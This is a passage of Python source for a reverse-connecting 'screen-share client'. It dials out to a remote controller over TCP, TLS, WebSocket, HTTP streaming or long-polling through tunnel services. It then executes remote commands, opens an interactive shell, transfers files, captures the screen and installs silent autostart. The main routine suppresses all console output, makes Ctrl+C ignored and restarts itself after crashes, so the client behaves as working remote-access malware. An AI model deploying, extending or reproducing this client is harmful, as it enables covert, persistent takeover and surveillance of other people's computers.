        for sock in (self._in, self._out):
            try:
                sock.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                sock.close()
            except OSError:
                pass

    def _path(self, endpoint, extra):
        query = 'session={}'.format(quote(self.session_id, safe=''))
        if extra:
            query += '&' + extra
        return '/poll/{}?{}'.format(endpoint, query)

    def _notify_close(self):
        extra = 'close=1&role={}'.format(quote(self.role, safe=''))
        if self.token:
            extra += '&token={}'.format(quote(self.token, safe=''))
        try:
            _poll_request(self.host, self.port, self.use_tls, 'POST',
                          self._path('up', extra), body=b'', timeout=2.0)
        except Exception:
            pass

    def _headers(self):
        lines = [
            'X-CMon-Session: {}'.format(self.session_id),
            'X-CMon-Role: {}'.format(self.role),
        ]
        if self.token:
            lines.append('X-CMon-Token: {}'.format(self.token))
        return lines

    def _write_local(self, data):
        view = memoryview(data)
        while view:
            try:
                sent = self._out.send(view)
            except (socket.timeout, TimeoutError):
                if self._closed:
                    raise ConnectionError('poll tunnel closed')
                continue
            if sent <= 0:
                raise ConnectionError('poll tunnel closed')
            view = view[sent:]

    def _down_loop(self):
        try:
            pending = self._initial
            if pending:
                self._write_local(pending)
                self.down_pos += len(pending)
            while not self._closed:
                extra = 'ack={}&wait={}&role={}'.format(
                    self.down_pos, int(POLL_WAIT),
                    quote(self.role, safe=''))
                # Token in the query is the most proxy-portable form; the
                # controller also accepts the X-CMon-Token header.
                if self.token:
                    extra += '&token={}'.format(quote(self.token, safe=''))
                path = self._path('down', extra)
                code, headers, body = _poll_request(
                    self.host, self.port, self.use_tls, 'GET', path,
                    timeout=POLL_WAIT + 17)
                if code != 200:
                    if code in (404, 409, 410):
                        break
                    raise OSError('poll down returned HTTP {}'.format(code))
                if body:
                    self._write_local(body)
                    self.down_pos += len(body)
                if headers.get('x-cmon-poll-close'):
                    break
        except (OSError, ValueError, ConnectionError):
            pass
        finally:
            try:
                self._out.shutdown(socket.SHUT_WR)
            except OSError:
                pass

    def _up_loop(self):
        try:
            while not self._closed:
                try:
                    first = self.up_q.get(timeout=0.5)
                except queue.Empty:
                    continue
                if first is None:
                    break
                batch = bytearray(first)
                while len(batch) < POLL_BATCH:
                    try:
                        more = self.up_q.get_nowait()
                    except queue.Empty:
                        if len(batch) < 64 * 1024:
                            time.sleep(0.005)
                            try:
                                more = self.up_q.get_nowait()
                            except queue.Empty:
                                break
                        else:
                            break
                    if more is None:
                        break
                    batch += more
                if not batch:
                    continue
                self.up_seq += 1
                sequence = self.up_seq
                path = self._path(
                    'up', 'seq={}&role={}'.format(
                        sequence, quote(self.role, safe='')))
                if self.token:
                    path += '&token={}'.format(quote(self.token, safe=''))
                last_error = None
                for attempt in range(3):
                    try:
                        code, _headers, _body = _poll_request(
                            self.host, self.port, self.use_tls, 'POST', path,
                            body=bytes(batch), timeout=POLL_TIMEOUT)
                        if code == 200:
                            last_error = None
                            break
                        last_error = 'HTTP {}'.format(code)
                        if code in (403, 404, 409, 410):
                            raise OSError('poll upload rejected ({})'.format(
                                last_error))
                    except (OSError, ValueError) as e:
                        last_error = e
                    if self._closed:
                        break
                    time.sleep(0.2 * (attempt + 1))
                if last_error is not None:
                    print('[!] poll upload stopped: {}'.format(last_error))
                    break
        except (OSError, ValueError) as e:
            if not self._closed:
                print('[!] poll upload stopped: {}'.format(e))
        finally:
            try:
                self._out.shutdown(socket.SHUT_WR)
            except OSError:
                pass


def _poll_connect(host, port, use_tls=True, role='control', token=None):
    """Create one long-poll session and return its socket-shaped adapter."""
    sid = token if role == 'shell' and token else secrets.token_urlsafe(24)
    path = '/poll/down?session={}&ack=0&wait=0&role={}'.format(
        quote(sid, safe=''), quote(role, safe=''))
    if token:
        path += '&token={}'.format(quote(token, safe=''))
    code, _headers, initial = _poll_request(
        host, port, use_tls, 'GET', path, timeout=HTTP_HANDSHAKE_TIMEOUT + 5)
    if code != 200:
        raise TransportNotSupported(
            'poll session returned HTTP {}'.format(code))
    return PollTunnelClient(host, port, use_tls, sid, role=role, token=token,
                            initial=initial)


def _half_connect(host, port, use_tls=True, role='control', token=None):
    """Start GET /down and return a portable half-duplex adapter."""
    sid = token if role == 'shell' and token else secrets.token_urlsafe(24)
    sock = _connect_target(host, port)
    try:
        _tune_socket(sock)
        if use_tls:
            sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
            sock = _wrap_client_tls(sock, host)
        version = 'HTTP/1.0' if (os.environ.get('CMON_FORCE_HTTP10') or '').strip() in ('1', 'true', 'yes') else 'HTTP/1.1'
        lines = [
            'GET /down?session={} {}'.format(quote(sid, safe=''), version),
            'Host: {}'.format(_host_header(host, port)),
            'Connection: keep-alive',
            'X-CMon-Session: {}'.format(sid),
        ]
        lines.extend(_tunnel_headers(host, token, role))
        lines.extend(['', ''])
        sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
        sock.sendall('\r\n'.join(lines).encode('latin-1'))
        head, extra = _read_http_head(sock)
        parts = head.split('\r\n')
        status = parts[0].split(None, 2) if parts else []
        if len(status) < 2 or int(status[1]) != 200:
            raise TransportNotSupported('GET /down returned {}'.format(
                ' '.join(status[:2]) if status else 'no response'))
        headers = _http_headers(parts[1:])
        sock.settimeout(None)
        reader = _BodyStream(sock, headers, extra)
        return HalfTunnelClient(sock, reader, sid, host, port, use_tls,
                                role=role, token=token)
    except Exception:
        try:
            sock.close()
        except OSError:
            pass
        raise


def _client_tls_context(host='', allow_self_signed=False):
    """TLS 1.2/1.3 client context with safe defaults.

    Public tunnel hosts (ngrok, Pinggy, Cloudflare, ...) are verified with the
    system trust store.  A private/LAN address accepts the controller's
    self-signed certificate by default, matching the original one-line HTTPS
    behavior.  CONTROLLER_TLS_VERIFY=1 forces verification (with an optional
    CONTROLLER_TLS_CA bundle).  CONTROLLER_TLS_INSECURE=1 explicitly opts out
    for a public hostname when the user really wants that.
    """
    verify_text = (os.environ.get('CONTROLLER_TLS_VERIFY') or '').strip().lower()
    insecure_text = (os.environ.get('CONTROLLER_TLS_INSECURE') or '').strip().lower()
    verify = verify_text in ('1', 'true', 'yes', 'on')
    insecure = insecure_text in ('1', 'true', 'yes', 'on')
    private = _host_is_private(host)
    try:
        if verify:
            cafile = os.environ.get('CONTROLLER_TLS_CA') or None
            context = ssl.create_default_context(cafile=cafile)
        elif insecure or private or allow_self_signed:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
        else:
            context = ssl.create_default_context()
        try:
            context.minimum_version = ssl.TLSVersion.TLSv1_2
        except AttributeError:
            pass
        try:
            context.options |= ssl.OP_NO_COMPRESSION
        except AttributeError:
            pass
        try:
            context.set_alpn_protocols(['http/1.1'])
        except (AttributeError, NotImplementedError):
            pass
        return context
    except (OSError, ssl.SSLError) as e:
        raise OSError('cannot create TLS client context: {}'.format(e))


def _host_is_private(host):
    value = (host or '').strip().strip('[]').lower()
    if value in ('localhost', '0.0.0.0', '::1') or value.endswith('.local') \
            or value.endswith('.lan') or value.endswith('.internal'):
        return True
    try:
        address = ipaddress.ip_address(value)
    except ValueError:
        return False
    return bool(address.is_private or address.is_loopback
                or address.is_link_local or address.is_unspecified)


def _wrap_client_tls(sock, host, allow_self_signed=False):
    context = _client_tls_context(host, allow_self_signed=allow_self_signed)
    try:
        wrapped = context.wrap_socket(sock, server_hostname=host)
        try:
            selected = wrapped.selected_alpn_protocol()
        except (AttributeError, NotImplementedError, OSError):
            selected = None
        if selected not in (None, 'http/1.1'):
            try:
                wrapped.close()
            except OSError:
                pass
            raise TransportNotSupported(
                'TLS negotiated {!r}; this tunnel uses HTTP/1.1'.format(selected))
        return wrapped
    except (OSError, ssl.SSLError) as e:
        try:
            sock.close()
        except OSError:
            pass
        if isinstance(e, TransportNotSupported):
            raise
        raise OSError('TLS handshake failed: {}'.format(e))


def _transport_candidates(host, port, scheme):
    """Ordered transport families for an address.

    The first successful family is cached; within HTTP/HTTPS the caller tries
    WebSocket, then a streaming POST, then the half-duplex fallback.
    """
    scheme = (scheme or 'auto').lower()
    if scheme == 'tcp':
        return ['tcp']
    if scheme == 'tls':
        return ['tls']
    if scheme == 'https':
        return ['https']
    if scheme == 'http':
        return ['http']
    preferred = CONNECTION_TYPE if CONNECTION_TYPE in ('tcp', 'http', 'https') else None
    if _looks_like_tunnel_host(host) or port == 443:
        order = ['https', 'http']
    elif port == 80:
        order = ['http', 'https']
    else:
        order = ['tcp', 'tls', 'http', 'https']
    if preferred:
        order = [preferred] + [item for item in order if item != preferred]
    return order


def _cache_key(host, port, scheme):
    return (str(host).lower(), int(port), str(scheme).lower())


def _remember_transport(key, kind):
    with CMON_TRANSPORT_LOCK:
        CMON_TRANSPORT_CACHE['key'] = key
        CMON_TRANSPORT_CACHE['kind'] = kind


def _cached_transport(key):
    with CMON_TRANSPORT_LOCK:
        if CMON_TRANSPORT_CACHE.get('key') == key:
            return CMON_TRANSPORT_CACHE.get('kind')
    return None


def _recv_hello_ack(sock, timeout=TUNNEL_PROBE_TIMEOUT):
    """Send the application hello and wait for the controller's end-to-end ack.

    The ack is deliberately sent only after the controller has read our hello.
    That makes it a true proof that a tunnel forwards both directions; a proxy
    that buffers the request body cannot fake it.
    """
    try:
        sock.settimeout(timeout)
    except (AttributeError, OSError):
        pass
    try:
        send_msg(sock, {'type': 'hello', 'env': environment_report()})
        # recv_msg() uses select() for its stall timeout, which does not see
        # the Python socket timeout set above.  Pass an absolute deadline so a
        # buffering proxy fails over to the next transport in ~12 s instead of
        # waiting for the generic 300 s stall timeout.
        msg = recv_msg(sock, deadline=time.time() + timeout)
        if not isinstance(msg, dict) or msg.get('type') != 'hello_ack':
            raise TransportNotSupported(
                'controller did not acknowledge the tunnel handshake')
        return msg
    except (socket.timeout, TimeoutError):
        raise TransportNotSupported('tunnel handshake timed out')
    finally:
        try:
            sock.settimeout(None)
        except (AttributeError, OSError):
            pass


def _open_controller_connection(host, port, scheme='auto', role='control',
                                token=None):
    """Open an automatic transport and complete the application handshake.

    role='control' sends hello/wait-ack so a buffering proxy is detected before
    the main loop trusts the link.  role='shell' authenticates with the token
    issued on the control link; it has its own terminal-size handshake later.
    """
    key = _cache_key(host, port, scheme)
    candidates = _transport_candidates(host, port, scheme)
    cached = _cached_transport(key)
    if cached and cached in candidates:
        candidates = [cached] + [item for item in candidates if item != cached]
    errors = []
    for family in candidates:
        # Within one HTTP(S) family, try WebSocket first (best through
        # tunnels), then the streaming POST, then the half-duplex fallback,
        # and finally long polling for proxies that buffer whole responses.
        if family in ('http', 'https'):
            use_tls = family == 'https'
            variants = []
            if (os.environ.get('CMON_DISABLE_WS') or '').strip() not in ('1', 'true', 'yes'):
                variants.append(
                    ('websocket', lambda: _ws_connect(
                        host, port, '/shell' if role == 'shell' else '/tunnel',
                        use_tls=use_tls, token=token)))
            if (os.environ.get('CMON_DISABLE_STREAM') or '').strip() not in ('1', 'true', 'yes'):
                variants.append(
                    ('http-stream', lambda: _http_connect(
                        host, port, '/shell' if role == 'shell' else '/tunnel',
                        use_tls=use_tls, token=token)))
            if (os.environ.get('CMON_DISABLE_HALF') or '').strip() not in ('1', 'true', 'yes'):
                variants.append(
                    ('http-half', lambda: _half_connect(
                        host, port, use_tls=use_tls, role=role, token=token)))
            if (os.environ.get('CMON_DISABLE_POLL') or '').strip() not in ('1', 'true', 'yes'):
                variants.append(
                    ('http-poll', lambda: _poll_connect(
                        host, port, use_tls=use_tls, role=role, token=token)))
            cached_variant = _cached_transport(key)
            if cached_variant:
                variants.sort(key=lambda item: item[0] != cached_variant)
        elif family == 'tls':
            def raw_tls():
                sock = _connect_target(host, port)
                try:
                    _tune_socket(sock)
                    sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
                    sock = _wrap_client_tls(sock, host, allow_self_signed=True)
                    return _raw_handshake(sock, role, token)
                except Exception:
                    try:
                        sock.close()
                    except OSError:
                        pass
                    raise
            variants = [('tls', raw_tls)]
        else:
            def raw_tcp():
                sock = _connect_target(host, port)
                try:
                    _tune_socket(sock)
                    return _raw_handshake(sock, role, token)
                except Exception:
                    try:
                        sock.close()
                    except OSError:
                        pass
                    raise
            variants = [('tcp', raw_tcp)]
        for variant, factory in variants:
            sock = None
            try:
                sock = factory()
                if role == 'control':
                    _recv_hello_ack(sock)
                _remember_transport(key, variant)
                return sock, family, variant
            except Exception as e:
                errors.append('{}: {}'.format(variant, e))
                if sock is not None:
                    try:
                        sock.close()
                    except OSError:
                        pass
                continue
    raise TransportNotSupported('; '.join(errors) or 'no transport succeeded')


def _raw_handshake(sock, role, token=None):
    """CMON2 marker for raw TCP/TLS, with the shell token when needed."""
    if role == 'shell':
        if not token:
            raise TransportNotSupported('shell token is missing')
        line = 'CMON2 SHELL {}\n'.format(token).encode('ascii', 'ignore')
    else:
        line = CMON_MAGIC
    sock.settimeout(HTTP_HANDSHAKE_TIMEOUT)
    sock.sendall(line)
    data = b''
    while b'\n' not in data:
        chunk = sock.recv(1)
        if not chunk:
            raise TransportNotSupported('controller closed during CMON2 handshake')
        data += chunk
        if len(data) > 512:
            raise TransportNotSupported('CMON2 acknowledgement is too long')
    if not data.startswith(CMON_ACK.strip()):
        raise TransportNotSupported('unexpected CMON2 acknowledgement: {!r}'.format(data))
    sock.settimeout(None)
    return sock


def main():
    _silence_console()           # the client must never print to its console
    _harden_console()            # a hostile/odd name must never kill printing
    _immune_to_ctrl_c()          # Ctrl+C is never a way to stop this client
    _windows_dpi_aware()         # correct screenshot pixels on scaled displays
    if CONNECTION_TYPE not in VALID_CONNECTION_TYPES:
        print("[!] Unknown connection_type {!r}. Use auto, tcp, http or https."
              .format(CONNECTION_TYPE))
        return
    if any(a in ('-h', '--help') for a in sys.argv[1:]):
        print('usage: python client.py [address] [optional_port] [options]')
        print('       address: IP, host:port, tcp://host:port, tls://host:port,')
        print('                http://..., https://..., or a Pinggy/ngrok URL')
        print('       --persist          install auto-start (silent) for this client')
        print('       --visible          with --persist: show a window instead')
        print('       --log-file PATH    with --persist: keep a log file')
        print('       --remove-persist   remove the auto-start entry')
        print('       connection_type is only a preference; auto is recommended.')
        print('       The controller accepts every transport on one port.')
        return

    (target_ip, target_port, target_scheme, do_persist, do_remove,
     visible, log_file) = parse_args(sys.argv[1:])
    display_address = _host_header(target_ip, target_port)
    if target_scheme in ('tcp', 'tls', 'http', 'https'):
        display_address = '{}://{}'.format(target_scheme, display_address)

    print("[+] Reverse auto-transport screen-share client v20")
    print("[i] Controller: {}  (preference: {})".format(
        display_address, CONNECTION_TYPE.upper()))
    if target_scheme in ('https', 'auto') and not _host_is_private(target_ip):
        print("[i] Public HTTPS certificate verification is ON (system trust store).")
        print("    If a direct public endpoint uses a self-signed certificate,")
        print("    set CONTROLLER_TLS_INSECURE=1 in the client environment.")
    elif target_scheme == 'https':
        print("[i] Private HTTPS: the controller's self-signed certificate is")
        print("    accepted by default. Set CONTROLLER_TLS_VERIFY=1 and")
        print("    CONTROLLER_TLS_CA for strict verification.")

    if _loopback_target(target_ip) and not do_remove:
        print("[i] {} is this machine's own loopback address - that only works".format(target_ip))
        print("    when controller.py runs on THIS machine. For a controller on")
        print("    another machine or VM use its LAN address (the controller")
        print("    prints the exact command to use when it starts).")

    if do_remove:
        print(remove_autostart())
        return

    if do_persist:
        print(install_autostart(display_address, target_port, silent=not visible, log_file=log_file))
        return

    if is_ios():
        print("[i] iOS/iPadOS: stock iOS suspends sandboxed apps ~30s after they leave")
        print("    the foreground and gives them no way to capture the screen. This")
        print("    client is only fully usable on a jailbroken device with a real")
        print("    Python (pty + screencapture). Files may still transfer on stock iOS.")

    if is_android():
        api = android_api()
        print("[i] Android/Termux{}: shell, commands and files work without root.".format(
            ' (API {})'.format(api) if api else ''))
        print("    Screen capture needs root (su + screencap). Keep Termux unrestricted;")
        print("    Android 12+ may kill background processes (run termux-wake-lock;")
        print("    Android 14+: allow 'Disable child process restrictions' for Termux).")
        if api >= 37:
            print("    Android 17+: the Play Store Termux build must be allowed Nearby")
            print("    devices / local network; the F-Droid build does not need it.")

    if not gui_session_available():
        print("[i] Headless Linux session (no DISPLAY / WAYLAND_DISPLAY):")
        print("    commands, files and the shell work; screenshots and screen")
        print("    sharing need a desktop, so Pillow is not checked at startup.")
    # Never block the first connection on pip/apt/dnf. Pillow is checked
    # lazily by grab_screen(); an unavailable desktop reports that on capture.

    if is_android():
        # Keep the Termux process alive while this client runs; released on exit.
        _android_wake_lock(True)
        atexit.register(_android_wake_lock, False)

    # Persistent working directory: survives reconnects
    current_dir = os.getcwd()

    # Outer loop: runs until this program is closed or the controller says exit
    while True:
        # Keep trying until the controller is up, so the start order doesn't
        # matter. This loop never gives up: only 'exit' from the controller or
        # closing this program stops the client.
        failures = 0
        client_socket = None
        transport_label = '?'
        while True:
            try:
                # The auto connector resolves DNS with a bounded wait, tries
                # TCP/TLS/HTTP/HTTPS (WebSocket first), and completes the
                # hello/ack before returning.  A buffering tunnel therefore
                # fails here and the next transport is tried instead of
                # producing a half-connected client.
                client_socket, _family, transport_label = _open_controller_connection(
                    target_ip, target_port, target_scheme)
                client_socket.settimeout(None)
                break
            except Exception as e:
                failures += 1
                if failures == 1 or failures % 10 == 0:
                    print("[!] Controller not reachable at {} - {}; retrying every {}s...".format(
                        display_address, _connect_error_hint(e), RETRY_DELAY))
                client_socket = None
                time.sleep(RETRY_DELAY)

        print("[+] Connected to {} using {} (automatic transport)".format(
            display_address, transport_label))
        try:
            _tune_socket(client_socket)  # fast reconnect when this controller dies
        except OSError:
            pass

        # The hello was already sent and acknowledged inside the connector, so
        # a proxy that buffers request bodies can never be mistaken for a live
        # full-duplex link.  Serve commands until the controller goes away.
        stop = False
        del DEFERRED[:]                      # nothing left over from a dead session
        with CANCELED_LOCK:
            CANCELED.clear()
        try:
            while True:
                if DEFERRED:
                    # Requests read while a command was running - in order.
                    msg = DEFERRED.pop(0)
                else:
                    msg = recv_msg(client_socket)
                if msg is None:              # controller closed the connection
                    print("[!] Controller closed the connection. Reconnecting...")
                    break

                mtype = msg.get('type')
                req_id = msg.get('id')
                if req_id is not None and not _valid_req_id(req_id):
                    req_id = None       # hostile JSON can't break cancel bookkeeping

                # The controller stopped this request (Ctrl+Z / 'stop') before we
                # got to it: answer and move on instead of running it.
                if mtype not in ('exit', 'hello', 'cancel', 'cmd_kill',
                                 'screenshare_stop', 'transfer_begin',
                                 'transfer_entries', 'transfer_file_begin',
                                 'transfer_chunk', 'transfer_file_end',
                                 'transfer_abort', 'transfer_end') \
                        and _is_canceled(req_id):
                    why = _forget_canceled(req_id) or 'Ctrl+Z'
                    send_msg(client_socket, {'type': 'output', 'id': req_id,
                                             'data': '[client] canceled ({})'.format(why)})
                    continue

                if mtype == 'exit':
                    stop_stream(wait=0.5)
                    try:
                        send_msg(client_socket, {'type': 'output', 'id': req_id,
                                                 'data': '[client] shutting down'})
                    except OSError:
                        pass
                    stop = True
                    break

                if mtype == 'cmd':
                    command = msg.get('data', '')
                    if not isinstance(command, str):
                        send_msg(client_socket, {'type': 'error', 'id': req_id,
                                                 'data': 'cmd: data must be text'})
                        continue
                    if not command.strip():
                        continue

                    cd_result = change_dir(command, current_dir)
                    if cd_result is not None:
                        current_dir, output = cd_result
                        send_msg(client_socket, {'type': 'output', 'id': req_id,
                                                 'data': output if output is not None else '[no output]'})
                        continue

                    try:
                        text, stop_requested, exit_code = run_command(
                            client_socket, command, current_dir, req_id)
                    except Exception as e:
                        text, stop_requested, exit_code = (
                            'command failed: {}'.format(e), False, 127)
                    if stop_requested:
                        # Honor an exit even if the controller closed the
                        # socket without waiting for this final reply.
                        stop = True
                    if not text:
                        text = '[no output]'
                    reply = {'type': 'output', 'id': req_id, 'data': text}
                    if exit_code is not None:
                        reply['exit_code'] = exit_code
                    try:
                        send_msg(client_socket, reply)
                    except OSError:
                        if not stop:
                            raise
                    if stop_requested:
                        break
                    continue

                if mtype == 'upex':
                    try:
                        text, stop_requested, exit_code = run_upex(
                            client_socket, msg, current_dir, req_id)
                    except Exception as e:
                        text, stop_requested, exit_code = (
                            'upex failed: {}'.format(e), False, 1)
                    if stop_requested:
                        stop = True
                    if not text:
                        text = '[no output]'
                    reply = {'type': 'output', 'id': req_id, 'data': text}
                    if exit_code is not None:
                        reply['exit_code'] = exit_code
                    try:
                        send_msg(client_socket, reply)
                    except OSError:
                        if not stop:
                            raise
                    if stop_requested:
                        break
                    continue

                if mtype in ('cmd_kill', 'cancel'):
                    if mtype == 'cancel':
                        key = _incoming_key(req_id)
                        state = INCOMING_TRANSFERS.get(key) if key is not None else None
                        if state is not None:
                            # Keep consuming until transfer_end so the byte
                            # stream stays aligned, but discard the open file.
                            state.abort({'reason': msg.get('why') or
                                         'canceled by the controller'})
                        # A download runs in its own worker so this message
                        # can stop it before another chunk is sent.
                        _outgoing_cancel(req_id)
                    continue                # nothing else running: nothing to stop

                if mtype == 'download':
                    _serve_download_request(client_socket, msg, req_id,
                                            current_dir)
                    continue

                if mtype in ('transfer_begin', 'transfer_entries',
                             'transfer_file_begin', 'transfer_chunk',
                             'transfer_file_end', 'transfer_abort',
                             'transfer_end'):
                    _handle_transfer_message(client_socket, msg, req_id,
                                             current_dir)
                    continue

                if mtype == 'upload':
                    # Never trust the controller's path: a name such as
                    # '..\\..\\evil.dll' is traversal on Windows, and an
                    # absolute path would escape the current directory.
                    raw_name = str(msg.get('name') or 'uploaded.bin').replace('\\', '/')
                    name = os.path.basename(raw_name).replace('\x00', '_')
                    if name in ('', '.', '..'):
                        name = 'uploaded.bin'
                    if os.name == 'nt':
                        # Windows device names and alternate data streams are
                        # not ordinary files: CON/NUL open devices, and ':'
                        # selects an ADS. Do not let a remote name choose them.
                        stem = name.split('.', 1)[0].rstrip(' .').upper()
                        reserved = {'CON', 'PRN', 'AUX', 'NUL'}                             | {'COM{}'.format(i) for i in range(1, 10)}                             | {'LPT{}'.format(i) for i in range(1, 10)}
                        if stem in reserved or ':' in name:
                            name = '_' + name.replace(':', '_')
                        name = name.rstrip(' .') or 'uploaded.bin'
                    dest = os.path.join(current_dir, name)
                    try:
                        encoded = msg.get('data', '')
                        if not isinstance(encoded, str):
                            raise ValueError('upload data is not text')
                        decoded_size = (len(encoded) * 3) // 4
                        if decoded_size > MAX_MSG:
                            raise ValueError('legacy upload exceeds one protocol '
                                             'message; use the streamed transfer')
                        data = base64.b64decode(encoded, validate=True)
                        if len(data) > MAX_MSG:
                            raise ValueError('legacy upload exceeds one protocol '
                                             'message; use the streamed transfer')
                        fd, tmp_path = tempfile.mkstemp(prefix='.upload-', dir=current_dir)
                        try:
                            with os.fdopen(fd, 'wb') as f:
                                f.write(data)
                            # os.replace is atomic and replaces a pre-existing
                            # symlink instead of following it to another file.
                            os.replace(tmp_path, dest)
                        except Exception:
                            try:
                                os.remove(tmp_path)
                            except OSError:
                                pass
                            raise
                        send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': 'Saved to {} ({} bytes)'.format(dest, len(data))})
                    except Exception as e:
                        send_msg(client_socket, {'type': 'error', 'id': req_id, 'data': 'upload failed: {}'.format(e)})
                    continue

                if mtype == 'screenshot':
                    take_screenshot(client_socket, req_id)
                    continue

                if mtype == 'persist':
                    try:
                        report = install_autostart(display_address, target_port)
                    except Exception as e:
                        report = 'persist failed: {}'.format(e)
                    send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': report})
                    continue

                if mtype == 'unpersist':
                    try:
                        report = remove_autostart()
                    except Exception as e:
                        report = 'unpersist failed: {}'.format(e)
                    send_msg(client_socket, {'type': 'output', 'id': req_id, 'data': report})
                    continue

                if mtype == 'screenshare':
                    # One share at a time: stop the previous one, then stream in
                    # a thread so commands keep working while the screen is live.
                    stop_stream()
                    stream_stop = threading.Event()
                    stream_thread = threading.Thread(
                        target=_stream_worker,
                        args=(client_socket, msg.get('fps'), stream_stop, req_id),
                        name='screenshare', daemon=True)
                    with STREAM_LOCK:
                        STREAM['stop'] = stream_stop
                        STREAM['thread'] = stream_thread
                        STREAM['id'] = req_id
                    print('[+] Screen share started ({} fps)'.format(msg.get('fps') or 'max'))
                    try:
                        stream_thread.start()
                    except Exception as e:
                        # A thread that never started must not leave STREAM
                        # thinking a share is running (which blocked every
                        # later screenshare).
                        with STREAM_LOCK:
                            STREAM['stop'] = None
                            STREAM['thread'] = None
                            STREAM['id'] = None
                        send_msg(client_socket, {'type': 'error', 'id': req_id,
                                                 'data': 'screenshare: {}'.format(e)})
                    continue

                if mtype == 'screenshare_stop':
                    if stop_stream():
                        print('[+] Screen share stopped.')
                    else:
                        send_msg(client_socket, {'type': 'output', 'id': req_id,
                                                 'data': '[client] no screen share is running'})
                    continue

                if mtype == 'shell':
                    token = msg.get('token')
                    if not token:
                        send_msg(client_socket, {'type': 'error', 'id': req_id,
                                                 'data': 'shell: controller sent no token; '
                                                         'update both scripts together'})
                        continue
                    start_interactive_shell(client_socket, target_ip, target_port,
                                            target_scheme, token, req_id)
                    continue

                send_msg(client_socket, {'type': 'error', 'id': req_id,
                                         'data': 'unknown message type: {}'.format(mtype)})
        except OSError as e:
            print("[!] Connection error: {}. Reconnecting...".format(e))
        except Exception as e:                  # never let one bad message kill us
            print("[!] Unexpected error: {}. Reconnecting...".format(e))

        stop_stream(wait=0.5)                   # a share cannot outlive its socket
        stop_shell()                            # ... and neither can an old shell
        _abort_outgoing_transfers()             # stop download workers
        _abort_incoming_transfers()             # remove unfinished partial files
        try:
            client_socket.shutdown(socket.SHUT_RDWR)   # wakes a parked send/recv
        except OSError:
            pass
        try:
            client_socket.close()
        except OSError:
            pass

        if stop:
            print("[+] Controller requested shutdown. Exiting.")
            break
        # otherwise: wait one retry interval, so a peer that accepts and then
        # immediately drops the connection cannot be hammered in a hot loop
        time.sleep(RETRY_DELAY)


if __name__ == "__main__":
    # Zero console output is a hard rule, even for fatal startup errors.
    _silence_console()
    # Ctrl+C must never end this client: keep running (and keep trying to
    # reach the controller) no matter how often it is pressed.
    _immune_to_ctrl_c()
    # The client is meant to stay alive: a crash restarts it unless 'exit'
    # was requested from the controller (then main() returns normally).
    while True:
        try:
            main()
            break
        except KeyboardInterrupt:
            print("[i] Ctrl+C ignored - still running, still reconnecting.")
            continue
        except Exception as e:
            print("[!] Unexpected fatal error: {} - restarting in {}s...".format(e, RETRY_DELAY))
            time.sleep(RETRY_DELAY)
